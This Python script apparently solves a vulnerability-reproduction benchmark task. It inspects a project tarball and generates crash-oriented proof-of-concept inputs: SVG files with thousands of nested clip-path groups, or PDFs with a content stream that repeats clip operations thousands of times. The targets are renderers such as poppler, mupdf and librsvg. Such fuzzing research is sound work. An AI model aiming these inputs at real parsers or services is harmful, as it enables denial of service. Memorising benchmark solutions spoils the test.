import os
import re
import tarfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        project = self._detect_project_name(src_path)
        proj_lower = (project or "").lower()

        try:
            # Prefer explicit project-based selection
            if "pdf" in proj_lower or proj_lower in ("poppler", "mupdf", "ghostscript"):
                return self._generate_pdf_poc()
            if (
                "svg" in proj_lower
                or proj_lower in ("librsvg", "resvg", "skia", "cairo")
            ):
                return self._generate_svg_poc()
        except Exception:
            pass

        # If project name didn't help, try to infer from fuzz targets
        try:
            fmt_hint = self._detect_format_from_sources(src_path)
            if fmt_hint == "pdf":
                return self._generate_pdf_poc()
            if fmt_hint == "svg":
                return self._generate_svg_poc()
        except Exception:
            pass

        # Fallback: SVG with deep clip nesting is a reasonable generic stress input
        return self._generate_svg_poc()

    def _detect_project_name(self, src_path: str):
        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    name = m.name.lower()
                    if name.endswith("project.yaml") or name.endswith("project.yml"):
                        f = tf.extractfile(m)
                        if not f:
                            continue
                        try:
                            data = f.read(4096).decode("utf-8", "ignore")
                        finally:
                            f.close()
                        m2 = re.search(r"project:\s*([^\s]+)", data)
                        if m2:
                            return m2.group(1).strip()
        except Exception:
            pass
        return None

    def _detect_format_from_sources(self, src_path: str):
        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    name = m.name.lower()
                    if not name.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hpp")):
                        continue
                    if "fuzz" not in name and "target" not in name:
                        continue
                    if not m.isfile() or m.size == 0:
                        continue
                    f = tf.extractfile(m)
                    if not f:
                        continue
                    try:
                        data = f.read(16384)
                    finally:
                        f.close()
                    low = data.lower()
                    if b"svg" in low:
                        return "svg"
                    if b"pdf" in low:
                        return "pdf"
        except Exception:
            pass
        return None

    def _generate_svg_poc(self, target_len: int = 913919) -> bytes:
        header = (
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">\n'
            "  <defs>\n"
            '    <clipPath id="c">\n'
            '      <rect x="0" y="0" width="100" height="100"/>\n'
            "    </clipPath>\n"
            "  </defs>\n"
        )
        footer = "</svg>\n"
        open_g = '<g clip-path="url(#c)">'
        close_g = "</g>"

        base_len = len(header) + len(footer)
        unit = len(open_g) + len(close_g)

        min_depth = 2048
        if target_len <= base_len + unit * min_depth:
            depth = min_depth
        else:
            depth = (target_len - base_len) // unit
            if depth < min_depth:
                depth = min_depth

        nested = open_g * depth + close_g * depth
        svg = header + nested + footer
        return svg.encode("utf-8")

    def _generate_pdf_poc(self, target_len: int = 913919) -> bytes:
        header = b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n"

        pattern = b"q 0 0 100 100 re W n\n"
        unit = len(pattern)

        approx_content_len = max(1024, target_len - 2000)
        depth = approx_content_len // unit
        if depth < 2048:
            depth = 2048

        content_stream = pattern * depth

        objs = []
        objs.append("1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n")
        objs.append("2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n")
        objs.append(
            "3 0 obj\n"
            "<< /Type /Page /Parent 2 0 R /Resources << >> "
            "/MediaBox [0 0 612 792] /Contents 4 0 R >>\n"
            "endobj\n"
        )

        length_str = str(len(content_stream))
        objs.append(
            "4 0 obj\n"
            f"<< /Length {length_str} >>\n"
            "stream\n"
        )

        all_parts = [header]
        offsets = []
        position = len(header)

        for obj_text in objs[:3]:
            obj_bytes = obj_text.encode("ascii")
            offsets.append(position)
            all_parts.append(obj_bytes)
            position += len(obj_bytes)

        obj4_prefix = objs[3].encode("ascii")
        offsets.append(position)
        all_parts.append(obj4_prefix)
        position += len(obj4_prefix)

        all_parts.append(content_stream)
        position += len(content_stream)

        obj4_suffix = b"endstream\nendobj\n"
        all_parts.append(obj4_suffix)
        position += len(obj4_suffix)

        xref_start = position
        xref_lines = []
        xref_lines.append(b"xref\n0 5\n")
        xref_lines.append(b"0000000000 65535 f \n")
        for off in offsets:
            xref_lines.append(f"{off:010d} 00000 n \n".encode("ascii"))
        xref_block = b"".join(xref_lines)
        all_parts.append(xref_block)
        position += len(xref_block)

        trailer = (
            "trailer\n"
            "<< /Size 5 /Root 1 0 R >>\n"
            "startxref\n"
            f"{xref_start}\n"
            "%%EOF\n"
        ).encode("ascii")
        all_parts.append(trailer)

        pdf = b"".join(all_parts)
        return pdf
